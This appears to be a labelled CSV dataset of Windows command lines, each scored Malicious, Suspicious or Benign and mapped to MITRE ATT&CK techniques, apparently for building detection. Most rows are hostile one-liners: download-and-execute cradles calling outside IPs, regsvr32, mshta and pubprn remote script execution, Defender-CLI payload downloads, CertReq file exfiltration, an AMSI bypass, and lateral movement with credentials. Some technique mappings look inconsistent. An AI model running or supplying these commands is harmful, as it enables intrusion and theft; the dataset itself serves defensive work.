Prompt,Description,LOLBin,Content,Frequency,Source,Network,Behavioural,History,MITRE ID,MITRE Technique,Score,Type
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET'...),Uses COM object to issue HTTP request — stealth download method,No,Script,Rare,Remote,Yes,Obfuscated Downloader,Used in evasive loaders,T1059.001,PowerShell,0.95,Malicious
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.119.155/PowerUp.ps1""...)",Downloads PowerUp.ps1 script — often used in privilege escalation,No,Script,Rare,Remote,Yes,PowerShell Download,Common in recon,T1059.001,PowerShell,0.95,Malicious
"powershell Invoke-WebRequest ""http://10.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData...\Rev.exe""",Downloads reverse shell to startup folder,No,Executable,Rare,Remote,Yes,Reverse Shell Setup,Confirmed red team use,T1059.001,PowerShell,0.95,Malicious
powershell $bytes = [System.Text.Encoding]::Unicode.GetBytes($command),Encodes command in memory — used for obfuscation,No,Script,Rare,Script,No,Obfuscated Execution,Seen in staged payloads,T1027,Obfuscated Files,0.85,Malicious
powershell $encodedCommand = [Convert]::ToBase64String($bytes),Converts payload to Base64 — staging for -enc,No,Script,Rare,Script,No,Payload Encoding,Frequently abused in scripts,T1027,Obfuscated Files,0.85,Malicious
powershell Get-DomainUser,select -ExpandProperty cn,Queries domain user objects — reconnaissance,No,Script,Common,Local,No,User Enumeration,Used in domain mapping,T1087.002,0.45,Suspicious
powershell IEX(New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.ps1'),Loads PowerView from alternate server,No,Script,Rare,Remote,Yes,Recon Scripting,Red team standard tool,T1087.002,Domain Account,0.95,Malicious
sc \host.domain start ExampleService,Starts previously created remote service,Yes,Executable,Rare,Remote,Yes,Lateral Execution,Part of post-exploit chain,T1021.002,Admin Shares,1,Malicious
schtasks /F /delete /tn ExampleTask /S 10.10.10.10,Deletes remote task — anti-forensics or cleanup,Yes,Registry,Rare,Remote,Yes,Artifact Removal,Seen in advanced persistence,T1070.004,File Deletion,1,Malicious
psexec \10.10.10.10 -u Domain\User -p Password ipconfig,Executes command remotely via PsExec,Yes,Executable,Common,Remote,Yes,Lateral Movement,Classic toolset abuse,T1021.002,SMB/Windows Admin Shares,0.8,Malicious
"powershell [Delegate]::CreateDelegate((""Func``3[String...",Constructs and invokes PowerShell functions dynamically,No,Script,Rare,Script,No,Reflective Execution,Seen in in-memory loaders,T1027.005,Non-standard Encoding,0.85,Malicious
rundll32.exe zipfldr.dll,Executes function from zip folder DLL — rarely used,Yes,DLL,Rare,Local,No,DLL Proxy Execution,Abused in evasion scenarios,T1574.002,DLL Side-Loading,0.8,Malicious
rundll32.exe url.dll,Loads and executes from URL-handling DLL,Yes,DLL,Rare,Local,No,System DLL Execution,Used in legacy payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe setupapi.dll,Executes functions from setup DLL,Yes,DLL,Rare,Local,No,System Configuration DLL,Seen in proxy payload execution,T1218,Signed Binary Proxy Execution,0.8,Malicious
rundll32.exe shell32.dll,Commonly misused to launch various system functions,Yes,DLL,Rare,Local,No,System Execution Abuse,Observed in LOLBins,T1218.011,Rundll32,0.8,Malicious
regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll,Executes remote COM script via regsvr32 — Squiblydoo,Yes,Script,Rare,Remote,Yes,Remote Execution via COM,Documented in MITRE,T1218.010,Regsvr32,1,Malicious
pubprn.vbs 127.0.0.1 script:https://10.10.10.10/folder/file.sct,Launches remote script via pubprn.vbs,Yes,Script,Rare,Remote,Yes,Script Proxy Execution,Squiblytwo class abuse,T1216.001,Signed Binary Proxy Execution,1,Malicious
"SyncAppvPublishingServer.vbs ""n;(New-Object Net.WebClient)...",Runs script embedded inside AppV server logic,Yes,Script,Rare,Remote,Yes,Scripting Abuse,Used in payload droppers,T1059.001,PowerShell,1,Malicious
rundll32.exe ieframe.dll,Executes functions from Internet Explorer frame DLL,Yes,DLL,Rare,Local,No,GUI Component Abuse,Seen in misused IE APIs,T1218,Signed Binary Proxy Execution,0.8,Malicious
rundll32.exe Mshtml.dll,Executes script engine via mshtml,Yes,Script,Rare,Local,No,MSHTML Execution,Classic Squiblytwo vector,T1218.010,Regsvr32,0.8,Malicious
regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll,Same COM remote script method using IP,Yes,Script,Rare,Remote,Yes,COM Script Execution,Well-known red team tactic,T1218.010,Regsvr32,1,Malicious
"wmic /node:target.domain process call create ""C:\Windows\Temp\Malice.exe""",Executes binary remotely using WMI,Yes,Executable,Rare,Remote,Yes,Remote Execution,Used in stealth deployments,T1047,WMI,1,Malicious
psexec \host.domain -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \host.domain\C$\Windows\Temp\build.xml,Executes MSBuild via PsExec from remote host,Yes,Executable,Rare,Remote,Yes,Compound LOLBin Abuse,Seen in post-exploit,T1127.001,MSBuild,1,Malicious
powershell [System.Management.Automation.AmsiUtils]::AmsiInitFailed,Disables AMSI — Anti-malware Scan Interface,No,Script,Rare,Script,No,Evasion,Critical for PowerShell attacks,T1562.001,Defense Evasion,0.85,Malicious
"powershell (New-Object Net.WebClient).DownloadString(""http://193.168.119.155/PowerUp.ps1"")",Loads privilege escalation script from remote server,No,Script,Rare,Remote,Yes,Remote Script Loader,Used in internal recon,T1059.001,PowerShell,0.95,Malicious
mshta.exe http://10.10.10.10/runme.hta,Loads HTA payload using mshta from IP,Yes,Script,Rare,Remote,Yes,LOLBin Execution,Used in phishing payloads,T1218.005,Mshta,1,Malicious
"rundll32.exe javascript:""..\mshtml""",Executes JavaScript through rundll32 and MSHTML,Yes,Script,Rare,Local,No,Script Engine Execution,Known as Squiblytwo,T1218.010,Regsvr32,0.8,Malicious
powershell IEX (New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.obs.ps1'),Loads PowerView (obfuscated) from remote server,No,Script,Rare,Remote,Yes,Domain Recon,Common tool abuse,T1087.002,Domain Account,0.95,Malicious
regini.exe newfile.txt:hidden.ini,Updates registry config using INI file,No,Registry,Rare,Script,No,Registry Tampering,Known in misconfig attacks,T1112,Modify Registry,0.85,Malicious
"Register-cimprovider -path ""C:\folder\evil.dll""",Registers custom CIM provider for persistence,No,DLL,Rare,Script,No,WMI Abuse,Known technique for stealth persistence,T1546.003,Event Subscription,0.85,Malicious
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Executes .NET DLL using InstallUtil with silent flag,Yes,DLL,Rare,Script,No,DLL Proxy Execution,Seen in red team chains,T1218.004,InstallUtil,0.9,Malicious
jsc.exe scriptfile.js,Compiles JavaScript into executable format,Yes,Scripts,Rare,Script,No,Code Compilation,Seen in obfuscated payload loaders,T1027.004,Compile After Delivery,0.9,Malicious
dotnet.exe [PATH_TO_DLL],Runs compiled DLL via dotnet CLI,Yes,DLL,Rare,Script,No,Framework Execution,Documented in .NET toolkits,T1218.012,DotNet Execution,0.9,Malicious
MSBuild.exe \host.domain\path\to\XMLfile.xml,Executes malicious MSBuild project via UNC path,Yes,Script,Rare,Remote,Yes,LOLBin Abuse,Seen in C2 frameworks,T1127.001,MSBuild,1,Malicious
rundll32.exe setupapi.dll,Executes function from setup API DLL,Yes,DLL,Rare,Local,No,DLL Proxy Execution,Confirmed LOLBin use,T1218.011,Rundll32,0.8,Malicious
rundll32.exe url.dll,Loads URL handler DLL — may be abused for redirection,Yes,DLL,Rare,Local,No,URL-based DLL Execution,Used in evasive payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe zipfldr.dll,Executes from Zip folder DLL component,Yes,DLL,Rare,Local,No,System Component Execution,Rare LOLBin usage,T1218.011,Rundll32,0.8,Malicious
pubprn.vbs 127.0.0.1 script:https://11.10.10.10/folder/file.sct,Loads script via pubprn using IP-based source,Yes,Script,Rare,Remote,Yes,LOLBin Script Execution,Known Squiblytwo variant,T1216.001,Signed Binary Proxy Execution,1,Malicious
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,Same technique using FQDN,Yes,Script,Rare,Remote,Yes,Scripting Proxy,Observed in phishing chains,T1216.001,Signed Binary Proxy Execution,1,Malicious
copy C:\Users\Administrator\Downloads\build.xml \10.10.10.10\C$\Windows\Temp,Transfers malicious MSBuild project to remote system,No,Files,Rare,Remote,Yes,Lateral Tool Staging,Common in red team ops,T1570,Lateral Tool Transfer,0.95,Malicious
powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://some.url/script.ps1'),In-memory execution of external PowerShell script,No,Script,Rare,Remote,Yes,Script Loader,Used in fileless malware,T1059.001,PowerShell,0.95,Malicious
cscript.exe //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4,Uses VBS to query process via WinRM,Yes,Script,Rare,Local,No,Scripting and Recon,Seen in lateral movement,T1047,WMI,0.8,Malicious
sc \10.10.10.10 start ExampleService,Starts malicious service remotely,Yes,Executable,Rare,Remote,Yes,Remote Service Abuse,Classic lateral execution,T1021.002,Admin Shares,1,Malicious
"Mshta.exe ""C:\ads\file.txt:file.hta""",Executes HTA embedded in alternate data stream,Yes,Script,Rare,Local,No,ADS Execution,Seen in stealth dropper chains,T1564.004,Hidden Files and ADS,0.8,Malicious
rasautou -d powershell.dll -p powershell -a a -e e,Launches PowerShell DLL via Remote Access Auto Connection,No,DLL,Rare,Script,No,UAC Bypass Vector,Used in bypass frameworks,T1547.001,Registry Modification,0.85,Malicious
rundll32.exe AllTheThingsx64,Executes exported function in custom DLL,Yes,DLL,Rare,Script,No,DLL Execution,Confirmed execution method,T1218.011,Rundll32,0.9,Malicious
regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,Dumps registry into alternate data stream,Yes,Registry,Rare,Script,No,Data Obfuscation,Used in persistence staging,T1564.004,Hidden Files and ADS,0.9,Malicious
extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe,Extracts executable via extrac32 — abuse for duplication,Yes,Files,Rare,Script,No,Binary Proxy Execution,Observed in evasive toolchains,T1218,Signed Binary Proxy Execution,0.9,Malicious
extrac32 /Y /C \webdavserver\share\test.txt C:\folder\test.txt,Pulls file from WebDAV — possible staging,Yes,Files,Rare,Remote,Yes,Remote File Transfer,Known in staging payloads,T1105,Ingress Tool Transfer,1,Malicious
ilasm.exe C:\public\test.txt /exe,Compiles IL assembly to EXE,Yes,Executable,Rare,Script,No,Payload Compilation,Seen in obfuscated loaders,T1027.004,Compile After Delivery,0.9,Malicious
ie4uinit.exe -BaseSettings,IE configuration tool — misused in UAC bypass,Yes,Registry,Rare,Local,No,LOLBin Initialization Abuse,Abused for elevation,T1548.002,Bypass UAC,0.8,Malicious
ieexec.exe http://11.11.11.11:8080/bypass.exe,Executes external EXE via IE execution host,Yes,Executable,Rare,Remote,Yes,Remote Execution,Seen in phishing attacks,T1218.005,Mshta,1,Malicious
explorer.exe /root,"Launches Explorer shell view (low threat, possibly suspicious)",Yes,System,Common,Local,No,GUI Execution,Minimal threat but logged,T1005,Data from Local System,0.6,Malicious
esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o,Copies VBScript via database utility,Yes,Files,Rare,Script,No,Alternate Copy Method,Observed in red team kits,T1564.004,Hidden Files and ADS,0.9,Malicious
cmstp.exe /ni /s https://raw.githubusercontent.com/.../Cmstp.inf,Uses connection manager to execute remote INF,Yes,Scripts,Rare,Remote,Yes,LOLBin Execution,Abused in phishing & C2,T1218.003,CMSTP,1,Malicious
cscript c:\ads\file.txt:script.vbs,Executes VBScript from ADS via cscript,Yes,Scripts,Rare,Script,No,ADS Script Execution,Used in stealth payloads,T1564.004,Hidden Files and ADS,0.9,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://10.10.10.10/encodedfile,Writes system binary from URL,Yes,Files,Rare,Remote,Yes,Binary Dropper,Used in remote execution,T1105,Ingress Tool Transfer,1,Malicious
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt,Posts local file contents in request — data exfil vector,Yes,Files,Rare,Remote,Yes,Covert Exfiltration,Seen in phishing frameworks,T1041,Exfiltration Over C2,1,Malicious
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/encodedfile,Transfers file to system32 via service utility,Yes,Files,Rare,Remote,Yes,Payload Deployment,Used in remote file drops,T1105,Ingress Tool Transfer,1,Malicious
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \192.168.0.149\dll\wtf.dll,Configures DNS server to load remote DLL,Yes,DLL,Rare,Remote,Yes,Remote DLL Load,Seen in domain persistence,T1574.002,DLL Side-Loading,1,Malicious
eventvwr.exe,Launches Event Viewer — can be used in UAC bypass,Yes,Executable,Rare,Local,No,Privilege Escalation,Used in UAC evasion,T1548.002,Bypass User Account Control,0.8,Malicious
diskshadow> exec calc.exe,Executes program via diskshadow script context,Yes,Executable,Rare,Local,No,Shadow Copy Execution,Known in ransomware attacks,T1003.003,NTDS,0.8,Malicious
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt,Downloads script to alternate data stream,Yes,Script,Rare,Remote,Yes,ADS Delivery,Used in fileless malware,T1564.004,Hidden Files and ADS,1,Malicious
bash.exe -c calc.exe,Launches Windows binary via bash — WSL abuse,Yes,Executable,Rare,Local,No,Cross-platform Execution,Seen in stealth loaders,T1059.004,Unix Shell,0.8,Malicious
ATBroker.exe /start malware,Executes payload via accessibility tool,Yes,Executable,Rare,Local,No,UAC Bypass Vector,Used in privilege escalation,T1546.008,Accessibility Features,0.8,Malicious
AT.exe at 09:00 /interactive /every:m,Creates scheduled task using legacy tool,Yes,System,Rare,Local,No,Task Scheduling,Observed in early malware,T1053.002,At,0.8,Malicious
"rundll32 ""C:\ads\file.txt:ADSDLL.dll""",Executes DLL embedded in alternate data stream,Yes,DLL,Rare,Local,No,ADS DLL Execution,Used in stealth backdoors,T1564.004,Hidden Files and ADS,0.8,Malicious
rundll32.exe shdocvw.dll,Loads shell document DLL — rarely abused,Yes,DLL,Rare,Local,No,DLL Function Execution,Rare but logged in some payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe syssetup.dll,Executes setup-based DLLs,Yes,DLL,Rare,Local,No,Setup Routine Abuse,Seen in stealth installers,T1218.011,Rundll32,0.8,Malicious
rundll32 syssetup.dll,Alternate invocation of system setup DLL,Yes,DLL,Rare,Local,No,UAC Abuse,Documented in privilege abuse,T1548.002,Bypass UAC,0.8,Malicious
Msconfig.exe -5,Launches msconfig with suspicious flag,Yes,Executable,Rare,Local,No,Parameter Abuse,Minimal but trackable,T1202,Indirect Command Execution,0.8,Malicious
expand c:\ADS\file1.bat c:\ADS\file2.bat,Uses expand to duplicate file within ADS,Yes,Files,Rare,Local,No,ADS Write Abuse,Known stealth move,T1564.004,Hidden Files and ADS,0.8,Malicious
expand \10.10.10.10\folder\file.bat c:\ADS\file.txt:file.bat,Transfers and writes remote batch into ADS,Yes,Files,Rare,Remote,Yes,Network Payload Transfer,Used in lateral payload staging,T1105,Ingress Tool Transfer,1,Malicious
hh.exe http://some.url/script.ps1,Executes external PowerShell script via HTML Help,Yes,Script,Rare,Remote,Yes,LOLBin Script Launcher,Seen in Squiblydoo variants,T1218.005,Mshta,1,Malicious
regsvcs.exe AllTheThingsx64.dll,Executes .NET DLL via RegSvcs binary,Yes,DLL,Rare,Script,No,DLL Loader Abuse,Classic LOLBin execution,T1218.009,Regsvr32/Regasm/Regsvcs,0.9,Malicious
MpCmdRun.exe -DownloadFile -url https://attacker/beacon.exe -path c:\temp\beacon.exe,Uses Defender CLI to fetch malicious file,Yes,Executable,Rare,Remote,Yes,LOLBin Downloader,Known in fileless delivery,T1105,Ingress Tool Transfer,1,Malicious
print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe,Writes file via print to ADS — evasion method,No,Files,Rare,Local,No,ADS Delivery,Used in red team persistence,T1564.004,Hidden Files and ADS,0.75,Malicious
MpCmdRun.exe -DownloadFile -url https://attacker/beacon.exe -path c:\temp\nicefile.txt:evil.exe,Downloads directly into ADS using Defender binary,Yes,Files,Rare,Remote,Yes,ADS Loader,Known in sandbox bypass attempts,T1564.004,Hidden Files and ADS,1,Malicious
Tracker.exe /d .\calc.dll /c C:\Windows\write.exe,Loads DLL via Tracker — rare LOLBin execution,No,DLL,Rare,Local,No,DLL Sideload,Abused in stealthy toolkits,T1574.002,DLL Side-Loading,0.75,Malicious
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe,Extracts archive to alternate data stream,Yes,Files,Rare,Local,No,ADS Payload Drop,Observed in weaponized payloads,T1564.004,Hidden Files and ADS,0.8,Malicious
Print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe,Uses print command to copy file — potential masquerade,No,Files,Rare,Local,No,File Masquerading,"Rare in the wild, but logged",T1036.003,Masquerading,0.75,Malicious
makecab \webdavserver\webdav\file.exe C:\Folder\file.cab,Compresses file from WebDAV share — staging method,Yes,Files,Rare,Remote,Yes,Remote Payload Delivery,Seen in red team payloads,T1105,Ingress Tool Transfer,1,Malicious
bginfo.exe bginfo.bgi /popup /nolicprompt,Executes config file for background tool — may hide payload,Yes,Executable,Rare,Local,No,Config-based Execution,Observed in payload injection,T1218,Signed Binary Proxy Execution,0.8,Malicious
pcalua.exe -a calc.exe,Launches binary via Compatibility Assistant,Yes,Executable,Rare,Local,No,UAC Bypass Vector,Used in evasive loaders,T1218,Signed Binary Proxy Execution,0.8,Malicious
regasm.exe AllTheThingsx64.dll,Registers .NET DLL — classic LOLBin method,Yes,DLL,Rare,Script,No,DLL Proxy Execution,Common among evasive payloads,T1218.009,Regsvr32/Regasm/Regsvcs,0.9,Malicious
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe,Uses forfiles to launch calculator — scripting abuse,Yes,Executable,Rare,Script,No,Binary Proxy Execution,Seen in script-based attacks,T1202,Indirect Command Execution,0.9,Malicious
findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe,Writes filtered content to ADS — data hiding technique,No,Files,Rare,Script,No,Obfuscation via Redirection,Seen in stealth data exfil,T1564.004,Hidden Files and ADS,0.85,Malicious
tasklist /V,Lists running tasks with details — may indicate recon,No,System,Common,Script,No,System Discovery,Seen in audits,T1057,Process Discovery,0.35,Suspicious
sc query,Enumerates services — useful for recon or legit admin,No,Registry,Common,Script,No,Service Discovery,Neutral,T1007,Service Discovery,0.3,Suspicious
net use Z: \internal\public,Maps a network share — could be lateral movement prep,No,Network,Common,Local,Yes,Mount Remote Resource,Seen in pentests,T1021.002,SMB Admin Shares,0.4,Suspicious
powershell Get-ScheduledTask,Lists all scheduled tasks — common recon tool,No,Script,Common,Script,No,Schedule Enumeration,Used in recon,T1053.005,Scheduled Task,0.45,Suspicious
wmic logicaldisk get name,Queries drive volumes — could be discovery or system mapping,Yes,System,Common,Script,No,Drive Enumeration,"Low threat, but noisy",T1082,System Info Discovery,0.3,Suspicious
notepad.exe,Opens Notepad — basic app launch,No,Executable,Common,Local,No,None,Harmless,—,—,0,Benign
ipconfig /all,Displays IP config — routine IT/admin use,No,System,Common,Local,No,None,Common admin use,—,—,0.05,Benign
echo Hello World,Simple echo test — no threat,No,None,Common,Local,No,None,Harmless,—,—,0,Benign
whoami,Shows current user — typical in dev/ops,No,Identity,Common,Local,No,None,Basic check,—,—,0.1,Benign
dir C:\Users\Public,Lists files — basic file operation,No,Files,Common,Local,No,None,Routine,—,—,0.1,Benign
netstat -ano,Lists active network connections — could be recon or admin,No,Network,Common,Local,No,Network Discovery,Neutral,T1049,System Network Connections,0.3,Suspicious
reg query HKLM\SYSTEM\CurrentControlSet\Services,Enumerates registry keys for services,No,Registry,Common,Script,No,Persistence Recon,Used in audits or malware,T1012,Query Registry,0.4,Suspicious
wmic useraccount list full,Enumerates all user accounts — could be recon,Yes,Identity,Rare,Script,No,Account Enumeration,Seen in red team tools,T1087,Account Discovery,0.45,Suspicious
powershell Get-LocalGroupMember -Group Administrators,Lists admin group members — local recon,No,Identity,Rare,Script,No,Privilege Check,Could support escalation,T1069,Permission Group Discovery,0.4,Suspicious
systeminfo,"Gathers OS version, hostname, etc.",No,System,Common,Local,No,Recon,Used in both admin & APTs,T1082,System Information Discovery,0.3,Suspicious
whoami /all,Lists user privileges — can be misused,No,Identity,Common,Local,No,Privilege Recon,Dual-use command,T1033,Security Context,0.3,Suspicious
"powershell ""Get-WmiObject -Class Win32_Product""",Queries installed programs — can be inventory or discovery,No,System,Common,Script,No,Recon Tool,Known in malware staging,T1518.001,Software Discovery,0.4,Suspicious
schtasks /query /fo LIST /v,Lists all scheduled tasks — potentially lateral prep,Yes,Schedule,Common,Script,No,Task Discovery,Used in recon,T1053.005,Scheduled Task,0.35,Suspicious
query user,Checks logged-in users — can support lateral movement,No,Identity,Common,Local,No,Session Recon,Logged in red team ops,T1087.001,Local Account Discovery,0.35,Suspicious
"powershell ""Get-ItemProperty -Path Registry::...""",Reads specific registry paths — dual use,No,Registry,Common,Script,No,Configuration Check,May reveal persistence,T1012,Query Registry,0.4,Suspicious
cls,Clears the screen — harmless,No,None,Common,Local,No,None,Harmless,—,—,0,Benign
help,Displays built-in help — zero risk,No,None,Common,Local,No,None,Neutral,—,—,0,Benign
cd C:\Users\Public,Changes directory — common file operation,No,Files,Common,Local,No,None,Legit use,—,—,0.05,Benign
set,Lists environment variables — typically harmless,No,System,Common,Local,No,None,Scripting use,—,—,0.1,Benign
hostname,Returns current machine name,No,Identity,Common,Local,No,None,Normal use,—,—,0.05,Benign
copy con test.txt,Creates a text file from CLI input,No,Files,Common,Local,No,None,Harmless scripting,—,—,0.1,Benign
date /t,Displays current date — harmless,No,System,Common,Local,No,None,Info only,—,—,0,Benign
time /t,Displays time — harmless,No,System,Common,Local,No,None,Info only,—,—,0,Benign
type nul > log.txt,Creates empty file — safe usage,No,Files,Common,Local,No,None,Automation-related,—,—,0.05,Benign
notepad log.txt,Opens a text file in Notepad,No,Files,Common,Local,No,None,Normal usage,—,—,0.05,Benign
